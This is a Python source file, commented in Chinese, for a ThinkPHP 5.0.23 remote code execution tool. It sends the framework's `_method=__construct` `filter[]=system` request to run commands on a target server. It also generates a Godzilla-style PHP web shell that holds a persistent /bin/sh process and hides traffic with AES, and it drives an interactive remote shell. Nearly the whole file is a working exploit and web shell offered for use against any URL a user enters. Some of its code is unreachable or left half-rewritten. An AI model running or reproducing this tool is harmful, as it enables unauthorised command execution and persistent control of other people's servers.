#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ThinkPHP 5.0.23 远程代码执行工具 - Godzilla风格持久化Shell模块
作者：网络安全工程师
"""

import base64
import requests
import json
import uuid
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time

# 确保中文显示正常
import sys
import io
# 仅在有stdout/stderr的环境中设置，避免在无控制台的GUI模式下出错
if sys.stdout is not None:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
if sys.stderr is not None:
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

class AESCryptor:
    """AES加密解密工具类，使用ECB模式和PKCS7填充"""
    
    @staticmethod
    def encrypt(data, key):
        """
        使用AES-ECB模式加密数据，返回Base64编码的密文
        :param data: 明文数据
        :param key: AES密钥（需要是16、24或32字节长度）
        :return: Base64编码的密文
        """
        # 确保密钥是bytes类型
        if isinstance(key, str):
            key_bytes = key.encode('utf-8')
        else:
            key_bytes = key
        
        # 确保密钥长度符合AES要求（16、24或32字节）
        if len(key_bytes) > 32:
            key_bytes = key_bytes[:32]  # 截取前32字节
        elif len(key_bytes) > 24:
            key_bytes = key_bytes[:24]  # 截取前24字节
        elif len(key_bytes) > 16:
            key_bytes = key_bytes[:16]  # 截取前16字节
        else:
            # 不足16字节则填充
            key_bytes = pad(key_bytes, 16)[:16]  # 填充并截取到16字节
        
        # 创建AES加密器（ECB模式）
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        
        # 对数据进行PKCS7填充并加密
        data_bytes = data.encode('utf-8')
        padded_data = pad(data_bytes, AES.block_size)
        encrypted_bytes = cipher.encrypt(padded_data)
        
        # Base64编码加密结果
        encoded_encrypted_data = base64.b64encode(encrypted_bytes)
        return encoded_encrypted_data.decode('utf-8')
    
    @staticmethod
    def decrypt(encrypted_data, key):
        """
        使用AES-ECB模式解密数据
        :param encrypted_data: Base64编码的密文
        :param key: AES密钥（需要是16、24或32字节长度）
        :return: 解密后的明文
        """
        # 确保密钥是bytes类型
        if isinstance(key, str):
            key_bytes = key.encode('utf-8')
        else:
            key_bytes = key
        
        # 确保密钥长度符合AES要求（16、24或32字节）
        if len(key_bytes) > 32:
            key_bytes = key_bytes[:32]  # 截取前32字节
        elif len(key_bytes) > 24:
            key_bytes = key_bytes[:24]  # 截取前24字节
        elif len(key_bytes) > 16:
            key_bytes = key_bytes[:16]  # 截取前16字节
        else:
            # 不足16字节则填充
            key_bytes = pad(key_bytes, 16)[:16]  # 填充并截取到16字节
        
        # 创建AES解密器（ECB模式）
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        
        # Base64解码密文
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # 解密并去除PKCS7填充
        decrypted_padded_data = cipher.decrypt(encrypted_bytes)
        decrypted_data = unpad(decrypted_padded_data, AES.block_size)
        
        return decrypted_data.decode('utf-8', errors='replace')


def generate_encrypted_payload(aes_key):
    """
    生成加密的服务端PHP Payload
    :param aes_key: AES加密密钥
    :return: 压缩后的PHP Payload字符串
    """
    # 使用模板字符串方式构建PHP代码，避免引号转义问题
    php_code_template = '''<?php
// 避免使用短标签，确保兼容性
session_start();

// 获取POST参数
$id = isset($_POST['id']) ? $_POST['id'] : 'default_session_id';
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';

// 注意：不再严格检查Session ID，允许默认值以增强兼容性

// AES密钥
$key = '{aes_key}';

// AES解密函数
function aes_decrypt($data, $key) {{
    // 确保密钥长度
    if (strlen($key) > 32) $key = substr($key, 0, 32);
    else if (strlen($key) > 24) $key = substr($key, 0, 24);
    else if (strlen($key) > 16) $key = substr($key, 0, 16);
    else $key = str_pad($key, 16, chr(0));
    
    // Base64解码
    $encrypted = base64_decode($data);
    // AES-ECB解密
    $decrypted = openssl_decrypt($encrypted, 'AES-ECB', $key, OPENSSL_RAW_DATA);
    // 去除PKCS7填充
    $pad_len = ord(substr($decrypted, -1));
    return substr($decrypted, 0, strlen($decrypted) - $pad_len);
}}

// AES加密函数
function aes_encrypt($data, $key) {{
    // 确保密钥长度
    if (strlen($key) > 32) $key = substr($key, 0, 32);
    else if (strlen($key) > 24) $key = substr($key, 0, 24);
    else if (strlen($key) > 16) $key = substr($key, 0, 16);
    else $key = str_pad($key, 16, chr(0));
    
    // PKCS7填充
    $block_size = 16;
    $pad_len = $block_size - (strlen($data) % $block_size);
    $padded = $data . str_repeat(chr($pad_len), $pad_len);
    // AES-ECB加密
    $encrypted = openssl_encrypt($padded, 'AES-ECB', $key, OPENSSL_RAW_DATA);
    // Base64编码
    return base64_encode($encrypted);
}}

// 初始化全局变量用于存储进程资源
if (!isset($GLOBALS['shell_sessions'])) {{
    $GLOBALS['shell_sessions'] = array();
}}

// 检查是否需要创建新的Shell会话
if (!isset($GLOBALS['shell_sessions'][$id]) || !is_resource($GLOBALS['shell_sessions'][$id]['process'])) {{
    // 创建一个持久的/bin/sh进程
    $descriptorspec = array(
        0 => array('pipe', 'r'),  // stdin
        1 => array('pipe', 'w'),  // stdout
        2 => array('pipe', 'w')   // stderr
    );
    
    // 启动shell进程
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    
    if (is_resource($process)) {{
        // 保存进程和管道资源
        $GLOBALS['shell_sessions'][$id] = array(
            'process' => $process,
            'stdin' => $pipes[0],
            'stdout' => $pipes[1],
            'stderr' => $pipes[2],
            'created_at' => time()
        );
    }} else {{
        die(json_encode(array('error' => '无法创建Shell进程')));
    }}
}}

// 获取当前会话的管道
$session = $GLOBALS['shell_sessions'][$id];
$stdin = $session['stdin'];
$stdout = $session['stdout'];
$stderr = $session['stderr'];

// 如果有命令要执行
if (!empty($cmd)) {{
    // 解密命令
    try {{
        $decrypted_cmd = aes_decrypt($cmd, $key);
        
        // 执行命令
        fwrite($stdin, $decrypted_cmd . "\n");
        fflush($stdin);
        
        // 等待命令执行完成
        usleep(500000); // 等待500ms
        
        // 读取stdout和stderr的输出
        $output = '';
        $error_output = '';
        
        // 设置非阻塞模式以防止死锁
        stream_set_blocking($stdout, 0);
        stream_set_blocking($stderr, 0);
        
        // 读取标准输出
        $start_time = time();
        while ((!feof($stdout) || !feof($stderr)) && (time() - $start_time) < 5) {{
            if (!feof($stdout)) {{
                $stdout_content = fread($stdout, 8192);
                if ($stdout_content !== false) {{
                    $output .= $stdout_content;
                }}
            }}
            
            if (!feof($stderr)) {{
                $stderr_content = fread($stderr, 8192);
                if ($stderr_content !== false) {{
                    $error_output .= $stderr_content;
                }}
            }}
            
            // 短暂休眠以避免CPU占用过高
            usleep(10000); // 10ms
        }}
        
        // 合并输出
        $result = $output . ($error_output ? "\n错误输出:\n" . $error_output : '');
        
        // 加密结果
        $encrypted_result = aes_encrypt($result, $key);
        
        // 返回加密后的结果
        echo json_encode(array('result' => $encrypted_result));
    }} catch (Exception $e) {{
        echo json_encode(array('error' => '命令执行失败: ' . $e->getMessage()));
    }}
}} else {{
    // 没有命令，仅返回会话ID表示连接成功
    echo json_encode(array('success' => '会话已建立', 'session_id' => $id));
}}

// 如果请求中有exit参数，则清理会话资源
if (isset($_POST['exit']) && $_POST['exit'] === '1') {{
    fclose($stdin);
    fclose($stdout);
    fclose($stderr);
    proc_close($session['process']);
    unset($GLOBALS['shell_sessions'][$id]);
    echo json_encode(array('success' => '会话已关闭'));
}}

?>
'''
    
    # 使用格式化字符串替换AES密钥
    php_payload = php_code_template.format(aes_key=aes_key)
    
    # 移除缩进和多余的换行符
    php_payload = php_payload.replace('    ', '').replace('\n    ', '\n')
    
    # 压缩PHP代码为一行，移除注释和多余的空白字符
    php_payload = php_payload.replace('\n', ' ').replace('\t', ' ')
    php_payload = ' '.join(php_payload.split())  # 合并多个空格为一个
    
    # 确保PHP代码不包含PHP开始和结束标签
    php_payload = php_payload.strip('<?php').strip('?>').strip()
    
    return php_payload


class GodzillaLikeShell:
    """Godzilla风格的持久化Shell会话客户端"""
    
    def __init__(self, url, aes_key=None):
        """
        初始化GodzillaLikeShell客户端
        :param url: 目标URL
        :param aes_key: AES加密密钥（可选，不提供则自动生成）
        """
        self.url = url
        # 如果没有提供密钥，自动生成一个16字节的随机密钥
        self.aes_key = aes_key if aes_key else str(uuid.uuid4()).replace('-', '')[:16]
        self.session_id = None
        self.is_connected = False
        self.request_timeout = 30  # 请求超时时间（秒）
        
        # 打印初始化信息
        print(f"[*] GodzillaLikeShell 初始化成功")
        print(f"[*] 目标URL: {self.url}")
        print(f"[*] AES密钥: {self.aes_key}")
    
    def init_session(self):
        """
        初始化会话
        :return: 成功返回True，失败返回False
        """
        try:
            # 生成会话ID
            self.session_id = str(uuid.uuid4())
            print(f"[*] 生成会话ID: {self.session_id}")  # 添加调试信息
            
            # 生成Payload，修正为只传入aes_key参数
            payload = generate_encrypted_payload(self.aes_key)
            print(f"[*] 生成Payload完成，长度: {len(payload)}")  # 添加调试信息
            
            # 从URL中提取主机信息
            parsed_url = requests.utils.urlparse(self.url)
            host = parsed_url.netloc
            
            # 构造请求头
            headers = {
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Referer": self.url,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh,zh-CN;q=0.9"
            }
            
            # 构造请求数据 - 修复为使用system过滤器，与ThinkPHP_GUI_2.5G.py完全一致
            encoded_payload = urllib.parse.quote(payload)
            data = f"_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D={encoded_payload}"            
            
            # 发送请求
            print("[*] 正在发送初始化请求...")  # 添加调试信息
            response = requests.post(self.url, headers=headers, data=data, timeout=self.request_timeout)
            print(f"[*] 初始化请求状态码: {response.status_code}")  # 添加调试信息
            
            # 处理响应
            try:
                # 尝试解析响应为JSON
                result = response.json()
                print(f"[*] 初始化响应JSON解析: {str(result)[:100]}...")  # 添加调试信息
                
                if 'success' in result and result['success']:
                    self.is_connected = True
                    print("[+] 会话建立成功")
                    return True
                elif 'error' in result:
                    print(f"[-] 会话建立失败: {result['error']}")
                    return False
            except json.JSONDecodeError:
                # 响应可能不是JSON格式，检查是否包含预期的结果
                print("[*] 响应不是JSON格式，尝试直接验证会话")
                # 直接尝试执行一个简单命令来验证会话是否真的建立
                try:
                    test_cmd = "echo 'test'"
                    print(f"[*] 构造测试命令: {test_cmd}")  # 添加调试信息
                    
                    # 使用与init_session相同的system过滤器格式发送测试命令
                    command_code = f"echo 'test'"  # 简单的测试命令
                    encoded_command = urllib.parse.quote(command_code)
                    test_data = f"_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D={encoded_command}"
                    
                    print(f"[*] 测试命令编码后: {encoded_command}")  # 添加调试信息
                    print(f"[*] 测试请求数据: {test_data[:100]}...")  # 添加调试信息
                    
                    test_response = requests.post(self.url, headers=headers, data=test_data, timeout=self.request_timeout)
                    
                    # 检查测试请求的状态码
                    print(f"[*] 测试请求状态码: {test_response.status_code}")
                    
                    # 处理测试响应
                    test_response_text = test_response.text.strip()
                    print(f"[*] 测试响应前100字符: {test_response_text[:100]}...")  # 添加调试信息
                    
                    # 检查是否包含'test'字符串
                    if 'test' in test_response_text:
                        self.is_connected = True
                        print("[+] 会话验证成功，GodzillaShell连接已建立")
                        return True
                    else:
                        print("[-] 会话验证失败，响应不包含预期内容'test'")
                        print(f"[-] 完整响应内容: {test_response_text}")
                except Exception as verify_error:
                    print(f"[-] 会话验证时发生错误: {str(verify_error)}")
                    import traceback
                    print(f"[-] 错误堆栈: {traceback.format_exc()}")
                
                # 验证失败，不假设会话建立
                self.is_connected = False
                print("[-] 会话建立失败: 无法验证会话有效性")
                return False
            
        except Exception as e:
            print(f"[-] 初始化会话时发生错误: {str(e)}")
            self.is_connected = False
            return False
    
    def execute(self, command):
        """
        执行命令并返回结果
        :param command: 要执行的命令字符串
        :return: 命令执行结果（字符串）或None（如果执行失败）
        """
        if not self.is_connected or not self.session_id:
            print("[-] 会话未建立，请先调用init_session()")
            return "错误: 会话未建立，请先连接目标服务器"
        
        try:
            # 从URL中提取主机信息
            parsed_url = requests.utils.urlparse(self.url)
            host = parsed_url.netloc
            
            # 构造请求头 - 与init_session保持一致
            headers = {
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Referer": self.url,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh,zh-CN;q=0.9"
            }
            
            # 简化命令构造，直接使用system过滤器执行命令
            # 不再使用加密和复杂的payload，直接执行简单命令
            encoded_command = urllib.parse.quote(command)
            data = f"_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D={encoded_command}"
            
            print(f"[*] 直接执行命令: {command}")  # 添加调试信息
            print(f"[*] URL编码后的命令: {encoded_command}")  # 添加调试信息
            print(f"[*] 请求数据长度: {len(data)} 字符")  # 添加调试信息
            
            # 发送请求
            print("[*] 正在发送命令请求...")
            response = requests.post(self.url, headers=headers, data=data, timeout=self.request_timeout)
            print(f"[*] 请求响应状态码: {response.status_code}")  # 添加调试信息
            
            # 处理响应
            response_text = response.text.strip()
            print(f"[*] 响应内容前100字符: {response_text[:100]}...")  # 添加调试信息
            print(f"[*] 完整响应长度: {len(response_text)} 字符")  # 添加调试信息
            
            # 尝试提取命令执行结果
            # 检查响应是否包含命令执行的文本结果
            # 从响应文本中分离出命令执行结果和HTML错误页面
            # 查找HTML标签开始前的内容
            if '<!DOCTYPE html>' in response_text or '<html>' in response_text.lower():
                print("[*] 检测到响应包含HTML内容，尝试提取命令执行结果...")
                
                # 查找HTML标签的位置
                html_start_pos = -1
                if '<!DOCTYPE html>' in response_text:
                    html_start_pos = response_text.find('<!DOCTYPE html>')
                elif '<html>' in response_text.lower():
                    html_start_pos = response_text.lower().find('<html>')
                
                # 提取HTML标签前的文本作为命令执行结果
                if html_start_pos > 0:
                    command_result = response_text[:html_start_pos].strip()
                    if command_result:
                        print(f"[*] 成功提取命令执行结果，长度: {len(command_result)} 字符")
                        return command_result
                    else:
                        print("[-] 提取的命令执行结果为空")
                
                # 如果没有在开始处找到HTML标签，尝试查找命令执行结果
                # 检查是否包含常见的命令输出模式
                # 例如，ls命令的输出通常包含文件名列表，不含HTML标签
                import re
                # 尝试提取所有不含HTML标签的文本块
                plain_text_blocks = re.findall(r'[^<]+(?=<[^/])', response_text)
                if plain_text_blocks:
                    # 取第一个非空的文本块
                    for block in plain_text_blocks:
                        block = block.strip()
                        if block:
                            print(f"[*] 从HTML响应中提取到文本块，长度: {len(block)} 字符")
                            return block
            
            # 如果响应不包含HTML或者无法提取结果，则使用原始响应
            return response_text
            try:
                result = response.json()
                print(f"[*] 响应JSON解析成功: {str(result)[:100]}...")  # 添加调试信息
                
                if 'result' in result:
                    # 解密结果
                    print(f"[*] 解密前结果: {result['result'][:30]}...")  # 添加调试信息
                    decrypted_result = AESCryptor.decrypt(result['result'], self.aes_key)
                    print(f"[*] 解密后结果长度: {len(decrypted_result)} 字符")  # 添加调试信息
                    # 如果解密结果为空但实际有内容，可能是编码问题
                    if not decrypted_result.strip() and len(result['result']) > 0:
                        print("[*] 警告: 解密结果为空，但加密数据不为空，尝试其他编码方式...")
                        # 尝试使用不同的编码方式解密
                        try:
                            # 直接返回原始解密字节
                            encrypted_bytes = base64.b64decode(result['result'])
                            # 创建AES解密器
                            key_bytes = self.aes_key.encode('utf-8')
                            if len(key_bytes) > 32: key_bytes = key_bytes[:32]
                            elif len(key_bytes) > 24: key_bytes = key_bytes[:24]
                            elif len(key_bytes) > 16: key_bytes = key_bytes[:16]
                            else: key_bytes = pad(key_bytes, 16)[:16]
                            cipher = AES.new(key_bytes, AES.MODE_ECB)
                            decrypted_bytes = cipher.decrypt(encrypted_bytes)
                            # 尝试去除填充并使用不同编码解码
                            decrypted_result = decrypted_bytes.decode('utf-8', errors='replace')
                            print("[*] 备用解码方式尝试完成")
                        except Exception as e:
                            print(f"[*] 备用解码方式失败: {str(e)}")
                    return decrypted_result
                elif 'error' in result:
                    print(f"[-] 命令执行失败: {result['error']}")
                    return f"命令执行失败: {result['error']}"  # 返回错误信息而不是None
                else:
                    print(f"[-] 未知的响应格式: {str(result)}")
                    return f"未知的响应格式: {str(result)}"  # 返回原始响应而不是None
            except json.JSONDecodeError:
                # JSON解析失败，尝试直接解密响应内容（某些情况下可能整个响应体就是加密数据）
                try:
                    print(f"[*] 尝试直接解密响应内容...")
                    decrypted_result = AESCryptor.decrypt(response_text, self.aes_key)
                    print(f"[*] 直接解密成功，结果长度: {len(decrypted_result)} 字符")
                    return decrypted_result
                except Exception as decrypt_error:
                    print(f"[-] 直接解密响应内容失败: {str(decrypt_error)}")
                    # 尝试直接返回原始响应
                    return f"[响应格式错误] 无法解析JSON且解密失败。原始响应:\n{response_text[:500]}..."  # 返回原始响应的前500字符
        except Exception as e:
            print(f"[-] 执行命令时发生错误: {str(e)}")
            return f"[执行错误] {str(e)}"  # 返回错误信息而不是None
    
    def interactive_shell(self):
        """
        创建交互式Shell界面
        """
        if not self.is_connected:
            print("[-] 请先调用init_session()建立会话")
            return
        
        print("\n[+] 交互式Shell已启动")
        print("[*] 输入 'exit' 退出Shell")
        print("[*] 输入 'clear' 清屏")
        print("[*] 支持cd命令切换目录（有状态）\n")
        
        try:
            while True:
                try:
                    # 获取用户输入
                    command = input("$ ").strip()
                    
                    # 处理特殊命令
                    if command.lower() == 'exit':
                        print("[*] 正在退出交互式Shell...")
                        # 发送退出命令并关闭会话
                        self.close_session()
                        break
                    elif command.lower() == 'clear':
                        # 清屏命令
                        print("\033[H\033[J", end="")
                        continue
                    
                    # 执行命令
                    result = self.execute(command)
                    
                    # 显示结果
                    if result is not None:
                        print(result)
                    
                except KeyboardInterrupt:
                    print("\n[*] 捕获到Ctrl+C，输入exit退出")
        except Exception as e:
            print(f"[-] 交互式Shell发生错误: {str(e)}")
        finally:
            print("[*] 交互式Shell已关闭")
    
    def close_session(self):
        """
        关闭当前会话并清理资源
        """
        if not self.is_connected or not self.session_id:
            return
        
        try:
            # 构造请求数据，通知服务端清理会话
            request_data = {
                "id": self.session_id,
                "exit": "1"
            }
            
            # 从URL中提取主机信息
            parsed_url = requests.utils.urlparse(self.url)
            host = parsed_url.netloc
            
            # 构造请求头
            headers = {
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
            }
            
            # 发送请求
            requests.post(self.url, headers=headers, data=request_data, timeout=self.request_timeout)
            
            # 更新状态
            self.is_connected = False
            self.session_id = None
            
        except Exception as e:
            print(f"[-] 关闭会话时发生错误: {str(e)}")


# 兼容旧的函数名要求
def encrypt(data, key):
    """加密函数（兼容旧接口）"""
    return AESCryptor.encrypt(data, key)

def decrypt(encrypted_data, key):
    """解密函数（兼容旧接口）"""
    return AESCryptor.decrypt(encrypted_data, key)


# 示例用法（如果直接运行此脚本）
if __name__ == "__main__":
    print("""
    =============================
      GodzillaLikeShell 演示程序
    =============================
    """)
    
    # 提示用户输入目标URL
    target_url = input("请输入目标ThinkPHP URL: ").strip()
    
    # 可以选择自定义密钥
    custom_key = input("请输入AES密钥（留空自动生成）: ").strip()
    
    # 创建GodzillaLikeShell实例
    if custom_key:
        shell = GodzillaLikeShell(target_url, custom_key)
    else:
        shell = GodzillaLikeShell(target_url)
    
    # 初始化会话
    if shell.init_session():
        # 启动交互式Shell
        shell.interactive_shell()
    else:
        print("[-] 初始化会话失败，程序退出")